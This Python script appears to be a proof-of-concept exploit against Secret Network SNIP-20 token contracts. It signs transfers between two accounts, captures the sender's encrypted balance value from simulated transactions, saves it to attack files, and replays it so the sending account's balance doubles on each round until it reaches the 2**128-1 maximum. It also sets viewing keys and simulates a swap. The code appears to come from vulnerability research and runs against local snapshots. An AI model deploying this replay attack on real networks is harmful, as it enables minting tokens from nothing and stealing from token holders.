import time
import json
import tempfile
import os
import sys
import random, glob, pickle
from base64 import b64encode

from utils import query_native, query_contract, get_codehash, generate_and_sign_tx, generate_and_sign_transfer, simulate_tx
from utils import set_snapshot, clear_snapshot, clear_outputs
from params_main import SECRETD, ATTACK_DIR, BAL_KEYS, TOKENS

UNIQUE_LABEL=str(time.time())

ACC0='secret1yhj0m3g8qramjjtv7g6quaqzdj77wwls4l555q'
ACC1='secret1uh83vxunp4jrnm47744wkzur5cfsfar959c74v'
SSCRT="secret1k0jntykt7e4g3y88ltc60czgjuqdy4c9e8fzek"
VICTIM="secret1klkjyu278c72rcwe46el769vgv4vdqjrcg5533"


SSCRT_HASH = get_codehash(SSCRT)

SETH = TOKENS['SETH']['addr']
SETH_HASH = get_codehash(SETH)

SETH_SSCRT = 'secret14zv2fdsfwqzxqt7s2ushp4c4jr56ysyld5zcdf'
SETH_SSCRT_HASH = get_codehash(SETH_SSCRT)

def set_snip20viewing_key(contract,addr):
    query = {"set_viewing_key":{"key":"vk"}}
    tx = generate_and_sign_tx(contract,addr,query)
    assert(simulate_tx(tx))

def query_snip20balance(contract,addr):
    query = {"balance": {"address":addr, "key":"vk"}}
    return query_contract(contract, query)


def secretswap():
    msg = b'{"swap":{"expected_return":"1"}}'
    msg = b64encode(msg).decode('utf-8')
    query = {"send":
             {"recipient":SETH_SSCRT,
              "amount":"10000",
              "msg": msg}}
    tx = generate_and_sign_tx(SSCRT,ACC0,query)
    r = simulate_tx(tx)
    assert(r is not None)
    return True

def boost_addr(contract):
    set_snapshot(f"{UNIQUE_LABEL}_boost")
    # TODO: It would be great to make this more flexible,
    # so we don't have to start off with exactly 10000 initial units.
    # This would require viewing keys to be working for us
    q = query_snip20balance(contract,ACC0)
    print('Initial balance of ACC0:', q)
    bal0 = int(q['balance']['amount'])
    goal = 2**128-1
    while bal0 < goal:
        # Transaction 1: Send the balance from ACC0 to ACC1
        tx = generate_and_sign_transfer(contract,ACC0,ACC1,bal0)
        replay = simulate_tx(tx)
        assert(replay is not None)

        # Replay the values we just read and prepare
        #   for the next transaction.
        # Item 1 is the sender's balance for this SNIP20 transfer.
        # So this replay value has the original ACC0 balance.
        replay_item = replay[1]
        # assert(BAL_KEYS['SSCRT'][ACC0]==replay_item[0])
        replay_val = replay_item[1]
        open(f"{ATTACK_DIR}/adv_key","w").write(replay_item[0])
        open(f"{ATTACK_DIR}/adv_value","w").write(replay_item[1])

        # Transaction 2: Send back the full amount from ACC1
        #  to ACC0, using the replayed value.
        #  Effectively doubles ACC0's balance.
        amt = min(goal-bal0,bal0)
        assert(simulate_tx(generate_and_sign_transfer(contract,ACC1,ACC0,amt)))
        clear_outputs()
        bal0 += amt
        print('balance:', bal0, 'key:', replay_item)
        
    _clear_kvstore()
    tx = generate_and_sign_transfer(SSCRT,ACC0,ACC0,2**128-1)
    replay = simulate_tx(tx)
    replay_item = replay[1]
    print('Boosted max value:', replay_item)



"""Also the first time we visit a new SNIP-20 token,
we need to simulate purchasing some amount.
We could do this by simulating a Sienna Swap transaction.
We would also need to simulate a viewing key.
"""
if 0:
    """Query diagnostics"""
    # secretd query bank balances $ACC0
    print(query_native(ACC0))
    print(query_native(ACC1))
    print(query_contract(SSCRT, {"exchange_rate":{}}))

    
if __name__ == '__main__':
    clear_outputs()
    snapname= f"{UNIQUE_LABEL}_boost"
    set_snapshot(snapname)
    set_snip20viewing_key(SSCRT,ACC0)
    set_snip20viewing_key(SETH,ACC0)
    print(query_native(ACC0))
    print(query_snip20balance(SSCRT,ACC0))
    print(query_snip20balance(SETH,ACC0))
    print(secretswap())
    print(query_snip20balance(SSCRT,ACC0))
    print(query_snip20balance(SETH,ACC0))
    
    boost_addr(SETH)
